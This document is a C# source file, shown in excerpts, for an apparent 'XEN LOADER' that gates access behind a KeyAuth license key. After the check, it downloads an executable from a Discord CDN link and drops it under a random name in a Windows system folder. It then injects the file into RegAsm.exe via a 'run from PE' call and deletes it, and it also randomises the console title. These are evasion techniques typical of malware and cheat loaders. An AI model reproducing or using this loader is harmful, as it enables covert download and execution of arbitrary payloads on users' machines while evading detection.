...
using XEN_LOADER.Utils;

namespace XEN_LOADER
{
    internal class Program
    {
        // Place your keyauth information here

        public static api KeyAuthApp = new api(name: "app name", ownerid: "your owner id", secret: "your secret", version: "1.0");

        static void Main(string[] args)
        {

            //Helpers.ConsoleExWriteLine(""); Center text use (WriteLine)
            //Helpers.ConsoleExWrite(""); Center text use (Write)

            // Settings name of exe you want to load or exe your pasting to load

            string exedownload = Helpers.Generate(5) + ".exe";


            // Setting console title to random string (15) chars

            Console.Title = Helpers.Generate(15);

            // Trash logo

            Helpers.ConsoleExSpace();
            Helpers.ConsoleExWriteLine("██╗  ██╗███████╗███╗   ██╗    ██╗      ██████╗  █████╗ ██████╗ ███████╗██████╗ ");
            Helpers.ConsoleExWriteLine("╚██╗██╔╝██╔════╝████╗  ██║    ██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗");
            Helpers.ConsoleExWriteLine(" ╚███╔╝ █████╗  ██╔██╗ ██║    ██║     ██║   ██║███████║██║  ██║█████╗  ██████╔╝");
            Helpers.ConsoleExWriteLine(" ██╔██╗ ██╔══╝  ██║╚██╗██║    ██║     ██║   ██║██╔══██║██║  ██║██╔══╝  ██╔══██╗");
            Helpers.ConsoleExWriteLine("██╔╝ ██╗███████╗██║ ╚████║    ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║");
            ...
            {
                Helpers.ConsoleExWriteLine("Status: " + KeyAuthApp.response.message);
                Thread.Sleep(2500);
                Environment.Exit(0);
            }

            // You know surley what this does..... -_-

            string key;

            // Login function using key if you want to use user function that works also

            Helpers.ConsoleExWrite("Input License Key: ");
            key = Console.ReadLine();
            KeyAuthApp.license(key);

            // Checking session is valid again....
            ...
            // START LOADER SHIT HERE...

            // Save file path of your exe file your downloading...

            string savefile = "C:\\Program Files (x86)\\Windows NT\\TableTextService\\en-US\\" + exedownload;

            // Here i use the standard web download function its better if you use keyauths if you dont use your own method like me which is simular to keyauths download function
            // I personally dont link adding apps / dlls ect to keyauth my self...

            WebClient web = new WebClient();
            web.DownloadFile("https://cdn.discordapp.com/attachments/952844474931896320/972181315388571698/XEN.exe", savefile);

            // Run from pe 

            Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"), File.ReadAllBytes(savefile));

            // Delete file that was loaded into memory

            File.Delete(savefile);


            // Then ofc app will exit
        }
